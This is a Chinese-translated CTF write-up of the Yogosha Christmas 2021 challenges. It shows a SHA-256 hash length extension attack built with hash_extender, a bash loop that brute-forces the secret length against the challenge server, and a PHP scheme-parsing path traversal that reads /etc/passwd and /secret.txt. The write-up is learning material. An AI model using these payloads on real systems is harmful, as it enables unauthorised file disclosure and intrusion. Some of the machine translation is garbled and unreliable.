<html>
<head>
<title>Yogosha Christmas 2021 CTF</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">2021年CTF日惹圣诞节</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/yogosha-christmas-2021-ctf-96166d508808?source=collection_archive---------1-----------------------#2022-01-01">https://infosecwriteups.com/yogosha-christmas-2021-ctf-96166d508808?source=collection_archive---------1-----------------------#2022-01-01</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="9dcc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">安全爱好者们好，今年圣诞节我玩了“CTF 2021年日惹”挑战，因为我在12月28日收到了他们团队的邮件，我很快就报名了。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/8e0b0b70021c9ad823b1654ea05e0c3d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*TZ86h0tbZhe5oq8R.jpeg"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated"><a class="ae lb" href="https://twitter.com/YogoshaOfficial" rel="noopener ugc nofollow" target="_blank">日奥官员</a></figcaption></figure><p id="12d8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">虽然我不能完成所有的挑战，但我学到了新的东西，即</p><ul class=""><li id="f313" class="lc ld iq jp b jq jr ju jv jy le kc lf kg lg kk lh li lj lk bi translated">哈希长度扩展攻击。</li><li id="0d9d" class="lc ld iq jp b jq ll ju lm jy ln kc lo kg lp kk lh li lj lk bi translated">LFI vuln。&amp; PHP的怪异行为。</li></ul><p id="bf97" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">整个CTF都是基于火影忍者的主题。</p><h1 id="dcba" class="lq lr iq bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">第一个挑战:</h1><p id="bcc2" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">这是一个简单的OSINT挑战，是关于追踪一个在flickr上发布图片的用户。图像的元数据包含下一个挑战的标志和链接。让我们专注于此。</p><h1 id="fbe9" class="lq lr iq bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">第二个挑战(宇智波或邪恶):</h1><p id="7dbb" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">挑战网址:<a class="ae lb" href="http://3.141.159.106" rel="noopener ugc nofollow" target="_blank">http://3.141.159.106</a>T5】描述:<em class="mt">听说/secret.txt里面有重要的东西</em></p><p id="caea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们尝试在web服务器上加载<strong class="jp ir"> /secret.txt </strong>文件。但是没有找到(404)。然后我问日惹管理员。答案是:<em class="mt">是的，它是根目录下的一个文件，我们必须访问那个</em> *。</p><p id="4091" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在少量枚举之后，我们可以读取<strong class="jp ir"> /robots.txt </strong>文件。</p><p id="74f5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用户代理:宇智波<br/>允许:/read.php</p><p id="bdf4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请注意用户代理字段。当你试图访问/read.php时，你通常会得到一个拒绝访问的消息。让我们截取请求并更改用户代理。</p><pre class="km kn ko kp gt mu mv mw mx aw my bi"><span id="b288" class="mz lr iq mv b gy na nb l nc nd">GET /read.php HTTP/1.1<br/>Host: 3.141.159.106<br/>User-Agent: Uchiha</span></pre><p id="f960" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有评论回应”！—我们的宇智波开发者被丹佐迷住了，请任何有经验的宇智波<strong class="jp ir">检查源代码漏洞</strong>；→"</p><p id="f2cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在有一个提交一些数据的功能，所以你可以用相同的用户代理发出一个post请求，在POST数据中加入一些散列和文件名，你将得到页面的源代码。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ne"><img src="../Images/b0dfd545de1f3862b23b7aa475455caf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*vwPbMr-qRzvVrVo9.png"/></div></div></figure><p id="dddf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是检查请求的用户代理的行。</p><p id="5322" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe nf ng nh mv b">if ($_SERVER['HTTP_USER_AGENT']!=="Uchiha")</code>:)</p><p id="5722" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在进一步阅读，我们得到了所有我们需要的php代码。</p><pre class="km kn ko kp gt mu mv mw mx aw my bi"><span id="b26c" class="mz lr iq mv b gy na nb l nc nd">&lt;?php<br/>include "secret.php";<br/>if(isset($_POST['string'])){<br/>	$arr=explode("|",$_POST['string']) ;<br/>	$filenames=$arr[1];<br/>	$hash=$arr[0];<br/>	if($hash===hash("sha256", $SECRET.$filenames ) &amp;&amp; preg_match("/\//",$filenames)===0 ){<br/>		foreach(explode(":",$filenames) as $filename){<br/>			if(in_array($filename,["read.php","index.php","guinjutsu.php"])) {<br/>				$jutsu=file_get_contents($filename);<br/>				echo "Sharingan: ".$jutsu;<br/>		}<br/>		}<br/>	}<br/>	else{<br/>		echo "Verification Failed! You didn't awaken your sharingan!";<br/>	}</span><span id="5e61" class="mz lr iq mv b gy ni nb l nc nd">}</span><span id="99fa" class="mz lr iq mv b gy ni nb l nc nd">}<br/>?&gt;</span></pre><ul class=""><li id="029e" class="lc ld iq jp b jq jr ju jv jy le kc lf kg lg kk lh li lj lk bi translated">现在，我们可以看到正在处理的是<strong class="jp ir"> string= </strong> i/p。</li></ul><ol class=""><li id="b7c5" class="lc ld iq jp b jq jr ju jv jy le kc lf kg lg kk nj li lj lk bi translated">首先，它检查是否设置了字符串变量。</li><li id="bcc5" class="lc ld iq jp b jq ll ju lm jy ln kc lo kg lp kk nj li lj lk bi translated"><strong class="jp ir"> explode() </strong>函数使用给定的分隔符，即“|”来断开数组中的字符串。</li><li id="efe7" class="lc ld iq jp b jq ll ju lm jy ln kc lo kg lp kk nj li lj lk bi translated">哈希部分存储在哈希变量中，文件名存储在文件名变量中。</li><li id="123e" class="lc ld iq jp b jq ll ju lm jy ln kc lo kg lp kk nj li lj lk bi translated">它检查提供的哈希是否等于通过在文件名前加上$SECRET并使用sha256算法计算的哈希。</li><li id="2da8" class="lc ld iq jp b jq ll ju lm jy ln kc lo kg lp kk nj li lj lk bi translated">它还通过使用<strong class="jp ir"> preg_match() </strong>检查文件名中是否存在“/”来检查文件名是否包含类似“…/…/…/”的LFI有效载荷。</li><li id="4023" class="lc ld iq jp b jq ll ju lm jy ln kc lo kg lp kk nj li lj lk bi translated">然后再次在delimeter ":"处中断文件名，并使用<strong class="jp ir"> file_get_content() </strong>获取其内容。</li></ol><p id="b323" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">虽然我明白这一点上的一切，但不知道什么是脆弱的。所以挣扎了一下，然后第二天离开了ctf。</p><p id="e0a4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第二天，我在discord上收到一条消息，说这是一个<strong class="jp ir">哈希长度扩展攻击</strong>，这也是后来在提示中添加的。<br/>现在这是密码世界中众所周知的攻击，但我完全不知道它的存在。让我们看看这是什么。</p><p id="cf82" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">博客:<a class="ae lb" href="https://blog.skullsecurity.org/2014/plaidctf-web-150-mtpox-hash-extension-attack" rel="noopener ugc nofollow" target="_blank">https://blog . skullsecurity . org/2014/plaidctf-we b-150-mt pox-hash-extension-attack</a><br/>工具:<a class="ae lb" href="https://github.com/iagox86/hash_extender" rel="noopener ugc nofollow" target="_blank">https://github.com/iagox86/hash_extender</a></p><ul class=""><li id="5e20" class="lc ld iq jp b jq jr ju jv jy le kc lf kg lg kk lh li lj lk bi translated">简而言之，如果一个应用程序允许用户同时控制<strong class="jp ir">散列</strong>和<strong class="jp ir">数据</strong>，并且认为将未知的<strong class="jp ir">秘密</strong>作为数据的前缀，那么散列是验证数据是它应该是什么的安全方式。</li><li id="fae6" class="lc ld iq jp b jq ll ju lm jy ln kc lo kg lp kk lh li lj lk bi translated">那么这个逻辑是错误的。在这种攻击中，我们可以通过<strong class="jp ir">将我们的有效载荷</strong>附加到<strong class="jp ir">数据</strong>来创建一个新的散列，这将与应用程序创建的散列相同。</li></ul><p id="3552" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我推荐阅读关于它的原始帖子。</p><ul class=""><li id="0e1d" class="lc ld iq jp b jq jr ju jv jy le kc lf kg lg kk lh li lj lk bi translated">现在要使用这个工具，除了用于散列的秘密长度之外，我们什么都有了。所以我们能做的是创造所有可能的组合，从1到50或者更高，直到我们找到正确的答案。</li></ul><p id="1515" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe nf ng nh mv b">./hash_extender -d='read.php' -s 184b5d255817fc0afe9316e67c8f386506a3b28b470c94f47583b76c7c0ec1e5 -f sha256 --out-data-format=html -l 8 -a ':guinjutsu.php'</code></p><p id="72bf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是它的输出非常整齐</p><pre class="km kn ko kp gt mu mv mw mx aw my bi"><span id="c81a" class="mz lr iq mv b gy na nb l nc nd">Type: sha256<br/>Secret length: 41<br/>New signature: fc979b4620daf4a9db3f5fdddfb3300469162e41daa0d60c976c336701bf7117 (new hash)<br/>New string: read%2ephp%80%00%00%00%00%00%00%00%00%00%00%00%00%01%88%3aguinjutsu%2ephp (new data)</span></pre><p id="beb6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们不能每次都手动生成100个有效负载并复制粘贴。所以创建了一个bash one liner，它将自动提取有用的数据并发送给服务器，并检查burp中的响应。</p><pre class="km kn ko kp gt mu mv mw mx aw my bi"><span id="c7f8" class="mz lr iq mv b gy na nb l nc nd">for i in {20..51}; do ./hash_extender -a=':guinjutsu.php' -d='read.php' -s 184b5d255817fc0afe9316e67c8f386506a3b28b470c94f47583b76c7c0ec1e5 -f sha256 --out-data-format=html -l $i -o data | sed -n 3p| cut -d ":" -f 2 | cut -d " " -f 2 &gt; hash; HASH=`cat hash`;DATA=`cat data`; curl -X POST 'http://3.141.159.106/read.php' -H "User-Agent: Uchiha" -d "string=$HASH%7C$DATA&amp;submit=Sharingan" -x http://127.0.0.1:8080; done</span></pre><ul class=""><li id="2558" class="lc ld iq jp b jq jr ju jv jy le kc lf kg lg kk lh li lj lk bi translated">这给出了正确的密钥长度，即41和我们需要的有效载荷。<code class="fe nf ng nh mv b">string=fc979b4620daf4a9db3f5fdddfb3300469162e41daa0d60c976c336701bf7117%7Cread%2ephp%80%00%00%00%00%00%00%00%00%00%00%00%00%01%88%3aguinjutsu%2ephp</code><br/><br/>利用这个我们可以读出guinjutsu.php文件的内容。</li></ul><pre class="km kn ko kp gt mu mv mw mx aw my bi"><span id="c610" class="mz lr iq mv b gy na nb l nc nd">Sharingan: &lt;?php<br/>// This endpoint is deprecated due to some problems, I heard that other clans have stolen some jutsus<br/>function check($url){<br/>   $par=parse_url($url);<br/>   if (((strpos($par['scheme'],'http')!==false)and($par['host']=='uchiha.fuinjutsukeeper.tech'))and($par['port']==5000)){<br/>       return True;</span><span id="22b9" class="mz lr iq mv b gy ni nb l nc nd">   }<br/>   else{<br/>       return False;<br/>   }</span><span id="fd0c" class="mz lr iq mv b gy ni nb l nc nd">}<br/>if (isset($_POST['submit'])){<br/>   if ((isset($_POST['api']))and(isset($_POST['endpoint']))){<br/>       $url=$_POST['api'].$_POST['endpoint'];<br/>       if (check($url)){<br/>           $opts = array(<br/> 'http'=&gt;array(<br/>   'method'=&gt;"GET",<br/>   'follow_location'=&gt;false,<br/>   'header'=&gt;"Accept-language: en\r\n" <br/> )<br/>);<br/>$context = stream_context_create($opts);<br/>$file = file_get_contents($url, false, $context);<br/>echo $file;</span><span id="0a91" class="mz lr iq mv b gy ni nb l nc nd">       }<br/>   }<br/>}<br/></span><span id="46cf" class="mz lr iq mv b gy ni nb l nc nd">?&gt;</span></pre><ul class=""><li id="290d" class="lc ld iq jp b jq jr ju jv jy le kc lf kg lg kk lh li lj lk bi translated">我们有一些php woo000！同样，我理解代码，但不知道潜在的漏洞。所以花了一些时间。</li><li id="2ebc" class="lc ld iq jp b jq ll ju lm jy ln kc lo kg lp kk lh li lj lk bi translated">首先，它检查POST请求数据，然后连接两个变量<strong class="jp ir"> api </strong>和<strong class="jp ir">端点</strong>，形成一个<strong class="jp ir"> url </strong>变量，并将其解析到<strong class="jp ir"> parse_url() </strong>函数，该函数以数组格式返回url的方案、主机和端口，并对其进行验证。</li></ul><p id="eb95" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe nf ng nh mv b">if (((strpos($par['scheme'],'http')!==false)and($par['host']=='uchiha.fuinjutsukeeper.tech'))and($par['port']==5000)</code></p><p id="65fc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">于是我赶紧给/guinjutsu.php端点发了一个类似这样的POST请求。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nk"><img src="../Images/aeaad4982309bad397e3b8b0b9416b31.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*urmrj8fKhWU15Duv.png"/></div></div></figure><p id="b448" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">并成功检查所有标记和<strong class="jp ir"> file_get_contents($url，false，$ context)；</strong>解析url并获取响应。</p><ul class=""><li id="c1dd" class="lc ld iq jp b jq jr ju jv jy le kc lf kg lg kk lh li lj lk bi translated">问题是file_get_content()是非常不安全的，它将获取任何数据本地，远程无关紧要。</li><li id="2b0b" class="lc ld iq jp b jq ll ju lm jy ln kc lo kg lp kk lh li lj lk bi translated">所以我试着用<code class="fe nf ng nh mv b">http://uchiha.fuinjutsukeeper.tech:5000/../../../../../../../etc/passwd</code>但是我得到了这样的回应</li></ul><p id="cc7d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe nf ng nh mv b">file_get_contents(http://uchiha.fuinjutsukeeper.tech:5000/../../../../../../etc/passwd): Failed to open stream: HTTP request failed! HTTP/1.1 400 Bad Request</code></p><pre class="km kn ko kp gt mu mv mw mx aw my bi"><span id="f3a7" class="mz lr iq mv b gy na nb l nc nd">which is standard response for malformed urls.</span></pre><ul class=""><li id="82ae" class="lc ld iq jp b jq jr ju jv jy le kc lf kg lg kk lh li lj lk bi translated">在这一点上，我忽略了一件非常重要的事情，即<code class="fe nf ng nh mv b">(strpos($par['scheme'],'http')</code>只是检查scheme中http字符串的存在，这也是提示中提到的<br/>，结果我在主题上徘徊了一段时间，从<a class="ae lb" href="https://blog.theo.com.tw/Research/PHP-The-issue-between-parse-url-and-real-path/#Interesting-about-parse-url" rel="noopener ugc nofollow" target="_blank"> parse_url LFI </a>博客到youtube orange的ssrf会谈等等。</li><li id="b7d0" class="lc ld iq jp b jq ll ju lm jy ln kc lo kg lp kk lh li lj lk bi translated">所以当我尝试<code class="fe nf ng nh mv b">api=localhosthttp://uchiha.fuinjutsukeeper.tech:5000/../../../../../../etc/passwd&amp;endpoint=&amp;submit=Sharingan</code>的时候。成功了</li></ul><pre class="km kn ko kp gt mu mv mw mx aw my bi"><span id="3acc" class="mz lr iq mv b gy na nb l nc nd">root:x:0:0:root:/root:/bin/bash<br/>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br/>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br/>sync:x:4:65534:sync:/bin:/bin/sync<br/>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br/>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br/>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br/>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br/>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br/>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br/>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br/>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br/>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br/>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br/>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br/>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br/>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br/>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span></pre><p id="fb43" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意scheme中的<strong class="jp ir"> localhosthttp </strong>不是一个有效的scheme，响应也包含关于它的警告以及文件的内容。</p><p id="535c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我很惊讶发生了什么，为什么会这样问创造者和一些peeps。显然这就是PHP工作方式，据说如果它不理解给定的方案，它会将<em class="mt"> file:// </em>协议作为默认协议。我发现php中的其他文件读取函数也存在同样的行为，如<strong class="jp ir"> inlcude() </strong>等。</p><ul class=""><li id="e14e" class="lc ld iq jp b jq jr ju jv jy le kc lf kg lg kk lh li lj lk bi translated">因此，我使用它读取了/secret.txt文件(…/…/…/…/…/secret.txt)的内容，并找到了挑战标志。</li></ul><p id="1fe5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你们有任何反馈，请告诉我。希望今年发布更多博客并跟踪进展。</p><p id="26ab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">谢谢你</p></div></div>    
</body>
</html>